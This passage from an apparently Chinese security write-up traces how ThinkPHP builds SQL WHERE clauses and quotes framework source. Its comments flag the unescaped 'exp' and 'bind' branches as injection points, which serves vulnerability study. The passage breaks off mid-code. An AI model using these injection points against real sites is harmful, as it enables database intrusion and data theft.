<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 指定查询条件 支持安全过滤</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> mixed $where 条件表达式</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> mixed $parse 预处理参数</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> Model</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">where</span>(<span class="params"><span class="variable">$where</span>,<span class="variable">$parse</span>=<span class="literal">null</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">is_null</span>(<span class="variable">$parse</span>) &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$where</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">is_array</span>(<span class="variable">$parse</span>)) &#123;</span><br><span class="line">            <span class="variable">$parse</span> = <span class="title function_ invoke__">func_get_args</span>();</span><br><span class="line">            <span class="title function_ invoke__">array_shift</span>(<span class="variable">$parse</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$parse</span> = <span class="title function_ invoke__">array_map</span>(<span class="keyword">array</span>(<span class="variable">$this</span>-&gt;db,<span class="string">&#x27;escapeString&#x27;</span>),<span class="variable">$parse</span>);<span class="comment">//addslashes</span></span><br><span class="line">        <span class="variable">$where</span> =   <span class="title function_ invoke__">vsprintf</span>(<span class="variable">$where</span>,<span class="variable">$parse</span>);</span><br><span class="line">    &#125;<span class="keyword">elseif</span>(<span class="title function_ invoke__">is_object</span>(<span class="variable">$where</span>))&#123;</span><br><span class="line">        <span class="variable">$where</span>  =   <span class="title function_ invoke__">get_object_vars</span>(<span class="variable">$where</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_string</span>(<span class="variable">$where</span>) &amp;&amp; <span class="string">&#x27;&#x27;</span> != <span class="variable">$where</span>)&#123;</span><br><span class="line">        <span class="variable">$map</span>    =   <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable">$map</span>[<span class="string">&#x27;_string&#x27;</span>]   =   <span class="variable">$where</span>;</span><br><span class="line">        <span class="variable">$where</span>  =   <span class="variable">$map</span>;</span><br><span class="line">    &#125;        </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;where&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;where&#x27;</span>] =   <span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;options[<span class="string">&#x27;where&#x27;</span>],<span class="variable">$where</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;where&#x27;</span>] =   <span class="variable">$where</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203171428217.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203171433361.png"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Home</span>\<span class="title class_">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$User</span> = <span class="title function_ invoke__">M</span>(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">        <span class="variable">$name</span> = <span class="title function_ invoke__">I</span>(<span class="string">&#x27;GET.name&#x27;</span>);</span><br><span class="line">        <span class="variable">$res</span> = <span class="variable">$User</span>-&gt;<span class="title function_ invoke__">field</span>(<span class="string">&#x27;id,username,password&#x27;</span>)-&gt;<span class="title function_ invoke__">where</span>(<span class="string">&quot;username=&#x27;%s&#x27;&quot;</span>,<span class="variable">$name</span>)-&gt;<span class="title function_ invoke__">select</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203171435896.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203171437191.png"></p>
<p>还可以使用<code>array(&quot;username&quot;=&gt;$name)</code>进行传参,在<code>$this-&gt;parseWhere(!empty($options[&#39;where&#39;])?$options[&#39;where&#39;]:&#39;&#39;),</code>进行参数处理并进行<code>escapeString</code>操作,具体流程如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ThinkPHP/Library/Think/Model.class.php</span></span><br><span class="line"><span class="comment">//$this-&gt;options[&#x27;where&#x27;] = $where;</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span>(<span class="params"><span class="variable">$options</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>) </span>&#123;</span><br><span class="line">    <span class="variable">$options</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">_parseOptions</span>(<span class="variable">$options</span>);<span class="comment">//$this-&gt;options 转化为 $options</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="variable">$resultSet</span>  = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">select</span>(<span class="variable">$options</span>);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#ThinkPHP/Library/Think/Db/Driver.class.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span>(<span class="params"><span class="variable">$options</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>) </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;model  =   <span class="variable">$options</span>[<span class="string">&#x27;model&#x27;</span>];</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseBind</span>(!<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;bind&#x27;</span>])?<span class="variable">$options</span>[<span class="string">&#x27;bind&#x27;</span>]:<span class="keyword">array</span>());</span><br><span class="line">    <span class="variable">$sql</span>    = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">buildSelectSql</span>(<span class="variable">$options</span>);</span><br><span class="line">    <span class="variable">$result</span>   = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>,!<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;fetch_sql&#x27;</span>]) ? <span class="literal">true</span> : <span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">buildSelectSql</span>(<span class="params"><span class="variable">$options</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>) </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="variable">$sql</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseSql</span>(<span class="variable">$this</span>-&gt;selectSql,<span class="variable">$options</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 替换SQL语句中表达式</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> array $options 表达式</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">parseSql</span>(<span class="params"><span class="variable">$sql</span>,<span class="variable">$options</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span>&#123;</span><br><span class="line">    <span class="variable">$sql</span>   = <span class="title function_ invoke__">str_replace</span>(</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&#x27;%TABLE%&#x27;</span>,<span class="string">&#x27;%DISTINCT%&#x27;</span>,<span class="string">&#x27;%FIELD%&#x27;</span>,<span class="string">&#x27;%JOIN%&#x27;</span>,<span class="string">&#x27;%WHERE%&#x27;</span>,<span class="string">&#x27;%GROUP%&#x27;</span>,<span class="string">&#x27;%HAVING%&#x27;</span>,<span class="string">&#x27;%ORDER%&#x27;</span>,<span class="string">&#x27;%LIMIT%&#x27;</span>,<span class="string">&#x27;%UNION%&#x27;</span>,<span class="string">&#x27;%LOCK%&#x27;</span>,<span class="string">&#x27;%COMMENT%&#x27;</span>,<span class="string">&#x27;%FORCE%&#x27;</span>),</span><br><span class="line">    <span class="keyword">array</span>(</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseTable</span>(<span class="variable">$options</span>[<span class="string">&#x27;table&#x27;</span>]),</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseDistinct</span>(<span class="keyword">isset</span>(<span class="variable">$options</span>[<span class="string">&#x27;distinct&#x27;</span>])?<span class="variable">$options</span>[<span class="string">&#x27;distinct&#x27;</span>]:<span class="literal">false</span>),</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseField</span>(!<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;field&#x27;</span>])?<span class="variable">$options</span>[<span class="string">&#x27;field&#x27;</span>]:<span class="string">&#x27;*&#x27;</span>),</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseJoin</span>(!<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;join&#x27;</span>])?<span class="variable">$options</span>[<span class="string">&#x27;join&#x27;</span>]:<span class="string">&#x27;&#x27;</span>),</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseWhere</span>(!<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>])?<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>]:<span class="string">&#x27;&#x27;</span>),<span class="comment">//对where语句进行分析</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseGroup</span>(!<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;group&#x27;</span>])?<span class="variable">$options</span>[<span class="string">&#x27;group&#x27;</span>]:<span class="string">&#x27;&#x27;</span>),</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseHaving</span>(!<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;having&#x27;</span>])?<span class="variable">$options</span>[<span class="string">&#x27;having&#x27;</span>]:<span class="string">&#x27;&#x27;</span>),</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseOrder</span>(!<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;order&#x27;</span>])?<span class="variable">$options</span>[<span class="string">&#x27;order&#x27;</span>]:<span class="string">&#x27;&#x27;</span>),</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseLimit</span>(!<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;limit&#x27;</span>])?<span class="variable">$options</span>[<span class="string">&#x27;limit&#x27;</span>]:<span class="string">&#x27;&#x27;</span>),</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseUnion</span>(!<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;union&#x27;</span>])?<span class="variable">$options</span>[<span class="string">&#x27;union&#x27;</span>]:<span class="string">&#x27;&#x27;</span>),</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseLock</span>(<span class="keyword">isset</span>(<span class="variable">$options</span>[<span class="string">&#x27;lock&#x27;</span>])?<span class="variable">$options</span>[<span class="string">&#x27;lock&#x27;</span>]:<span class="literal">false</span>),</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseComment</span>(!<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;comment&#x27;</span>])?<span class="variable">$options</span>[<span class="string">&#x27;comment&#x27;</span>]:<span class="string">&#x27;&#x27;</span>),</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseForce</span>(!<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;force&#x27;</span>])?<span class="variable">$options</span>[<span class="string">&#x27;force&#x27;</span>]:<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    ),<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$sql</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseWhere</span>(<span class="params"><span class="variable">$where</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$where</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">0</span>===<span class="title function_ invoke__">strpos</span>(<span class="variable">$key</span>,<span class="string">&#x27;_&#x27;</span>)) &#123;</span><br><span class="line">        <span class="comment">// 解析特殊条件表达式</span></span><br><span class="line">        <span class="variable">$whereStr</span>   .= <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseThinkWhere</span>(<span class="variable">$key</span>,<span class="variable">$val</span>);<span class="comment">//查询条件判断</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">// 查询字段的安全过滤</span></span><br><span class="line">        <span class="variable">$multi</span>  = <span class="title function_ invoke__">is_array</span>(<span class="variable">$val</span>) &amp;&amp;  <span class="keyword">isset</span>(<span class="variable">$val</span>[<span class="string">&#x27;_multi&#x27;</span>]);</span><br><span class="line">        <span class="variable">$key</span>    = <span class="title function_ invoke__">trim</span>(<span class="variable">$key</span>);</span><br><span class="line">        ...</span><br><span class="line">        <span class="variable">$whereStr</span> .= <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseWhereItem</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">parseKey</span>(<span class="variable">$key</span>),<span class="variable">$val</span>);<span class="comment">//parseWhereItem where子单元分析 / parseKey 字段和表名处理 column_name -&gt; `column_name`</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseWhereItem</span>(<span class="params"><span class="variable">$key</span>,<span class="variable">$val</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$whereStr</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$val</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_string</span>(<span class="variable">$val</span>[<span class="number">0</span>])) &#123;</span><br><span class="line">			<span class="variable">$exp</span>	=	<span class="title function_ invoke__">strtolower</span>(<span class="variable">$val</span>[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(eq|neq|gt|egt|lt|elt)$/&#x27;</span>,<span class="variable">$exp</span>)) &#123; <span class="comment">// 比较运算</span></span><br><span class="line">                ...<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseValue</span>(<span class="variable">$val</span>[<span class="number">1</span>]);</span><br><span class="line">            &#125;<span class="keyword">elseif</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(notlike|like)$/&#x27;</span>,<span class="variable">$exp</span>))&#123;<span class="comment">// 模糊查找</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$val</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                    <span class="variable">$likeLogic</span>  =   <span class="keyword">isset</span>(<span class="variable">$val</span>[<span class="number">2</span>])?<span class="title function_ invoke__">strtoupper</span>(<span class="variable">$val</span>[<span class="number">2</span>]):<span class="string">&#x27;OR&#x27;</span>;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$likeLogic</span>,<span class="keyword">array</span>(<span class="string">&#x27;AND&#x27;</span>,<span class="string">&#x27;OR&#x27;</span>,<span class="string">&#x27;XOR&#x27;</span>)))&#123;</span><br><span class="line">                        <span class="variable">$like</span>       =   <span class="keyword">array</span>();</span><br><span class="line">                        <span class="keyword">foreach</span> (<span class="variable">$val</span>[<span class="number">1</span>] <span class="keyword">as</span> <span class="variable">$item</span>)&#123;</span><br><span class="line">                            <span class="variable">$like</span>[] = ...<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseValue</span>(<span class="variable">$item</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="variable">$whereStr</span> .= <span class="string">&#x27;(&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27; &#x27;</span>.<span class="variable">$likeLogic</span>.<span class="string">&#x27; &#x27;</span>,<span class="variable">$like</span>).<span class="string">&#x27;)&#x27;</span>;                          </span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="variable">$whereStr</span> .= ...<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseValue</span>(<span class="variable">$val</span>[<span class="number">1</span>]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">elseif</span>(<span class="string">&#x27;bind&#x27;</span> == <span class="variable">$exp</span> )&#123; <span class="comment">// 使用表达式</span></span><br><span class="line">                <span class="variable">$whereStr</span> .= <span class="variable">$key</span>.<span class="string">&#x27; = :&#x27;</span>.<span class="variable">$val</span>[<span class="number">1</span>]; <span class="comment"># !!! 可能存在利用点,因为没有进行parseValue</span></span><br><span class="line">            &#125;<span class="keyword">elseif</span>(<span class="string">&#x27;exp&#x27;</span> == <span class="variable">$exp</span> )&#123; <span class="comment">// 使用表达式</span></span><br><span class="line">                <span class="variable">$whereStr</span> .= <span class="variable">$key</span>.<span class="string">&#x27; &#x27;</span>.<span class="variable">$val</span>[<span class="number">1</span>]; <span class="comment"># !!! 可能存在利用点,因为没有进行parseValue</span></span><br><span class="line">            &#125;<span class="keyword">elseif</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(notin|not in|in)$/&#x27;</span>,<span class="variable">$exp</span>))&#123; <span class="comment">// IN 运算</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$val</span>[<span class="number">2</span>]) &amp;&amp; <span class="string">&#x27;exp&#x27;</span>==<span class="variable">$val</span>[<span class="number">2</span>]) &#123;</span><br><span class="line">                    <span class="variable">$whereStr</span> .= <span class="variable">$key</span>.<span class="string">&#x27; &#x27;</span>.<span class="variable language_">$this</span>-&gt;exp[<span class="variable">$exp</span>].<span class="string">&#x27; &#x27;</span>.<span class="variable">$val</span>[<span class="number">1</span>]; <span class="comment"># !!! 可能存在利用点,因为没有进行parseValue</span></span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    ...</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">elseif</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(notbetween|not between|between)$/&#x27;</span>,<span class="variable">$exp</span>))&#123; <span class="comment">// BETWEEN运算</span></span><br><span class="line">                ...</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="title function_ invoke__">E</span>(<span class="title function_ invoke__">L</span>(<span class="string">&#x27;_EXPRESS_ERROR_&#x27;</span>).<span class="string">&#x27;:&#x27;</span>.<span class="variable">$val</span>[<span class="number">0</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$count</span> = <span class="title function_ invoke__">count</span>(<span class="variable">$val</span>);</span><br><span class="line">            <span class="variable">$rule</span>  = <span class="keyword">isset</span>(<span class="variable">$val</span>[<span class="variable">$count</span>-<span class="number">1</span>]) ? (<span class="title function_ invoke__">is_array</span>(<span class="variable">$val</span>[<span class="variable">$count</span>-<span class="number">1</span>]) ? <span class="title function_ invoke__">strtoupper</span>(<span class="variable">$val</span>[<span class="variable">$count</span>-<span class="number">1</span>][<span class="number">0</span>]) : <span class="title function_ invoke__">strtoupper</span>(<span class="variable">$val</span>[<span class="variable">$count</span>-<span class="number">1</span>]) ) : <span class="string">&#x27;&#x27;</span> ; </span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$rule</span>,<span class="keyword">array</span>(<span class="string">&#x27;AND&#x27;</span>,<span class="string">&#x27;OR&#x27;</span>,<span class="string">&#x27;XOR&#x27;</span>))) &#123;</span><br><span class="line">                <span class="variable">$count</span>  = <span class="variable">$count</span> -<span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$rule</span>   = <span class="string">&#x27;AND&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="variable">$count</span>;<span class="variable">$i</span>++) &#123;</span><br><span class="line">                <span class="variable">$data</span> = <span class="title function_ invoke__">is_array</span>(<span class="variable">$val</span>[<span class="variable">$i</span>])?<span class="variable">$val</span>[<span class="variable">$i</span>][<span class="number">1</span>]:<span class="variable">$val</span>[<span class="variable">$i</span>];</span><br><span class="line">                <span class="keyword">if</span>(<span class="string">&#x27;exp&#x27;</span>==<span class="title function_ invoke__">strtolower</span>(<span class="variable">$val</span>[<span class="variable">$i</span>][<span class="number">0</span>])) &#123;</span><br><span class="line">                    <span class="variable">$whereStr</span> .= <span class="variable">$key</span>.<span class="string">&#x27; &#x27;</span>.<span class="variable">$data</span>.<span class="string">&#x27; &#x27;</span>.<span class="variable">$rule</span>.<span class="string">&#x27; &#x27;</span>; <span class="comment"># !!! 可能存在利用点,因为没有进行parseValue</span></span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="variable">$whereStr</span> .= <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseWhereItem</span>(<span class="variable">$key</span>,<span class="variable">$val</span>[<span class="variable">$i</span>]).<span class="string">&#x27; &#x27;</span>.<span class="variable">$rule</span>.<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$whereStr</span> = <span class="string">&#x27;( &#x27;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$whereStr</span>,<span class="number">0</span>,-<span class="number">4</span>).<span class="string">&#x27; )&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//对字符串类型字段采用模糊匹配</span></span><br><span class="line">        <span class="variable">$likeFields</span>   =   <span class="variable language_">$this</span>-&gt;config[<span class="string">&#x27;db_like_fields&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$likeFields</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(&#x27;</span>.<span class="variable">$likeFields</span>.<span class="string">&#x27;)$/i&#x27;</span>,<span class="variable">$key</span>)) &#123;</span><br><span class="line">            <span class="variable">$whereStr</span> .= <span class="variable">$key</span>.<span class="string">&#x27; LIKE &#x27;</span>.<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseValue</span>(<span class="string">&#x27;%&#x27;</span>.<span class="variable">$val</span>.<span class="string">&#x27;%&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$whereStr</span> .= <span class="variable">$key</span>.<span class="string">&#x27; = &#x27;</span>.<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseValue</span>(<span class="variable">$val</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$whereStr</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseValue</span>(<span class="params"><span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_string</span>(<span class="variable">$value</span>)) &#123;</span><br><span class="line">        <span class="variable">$value</span> =  <span class="title function_ invoke__">strpos</span>(<span class="variable">$value</span>,<span 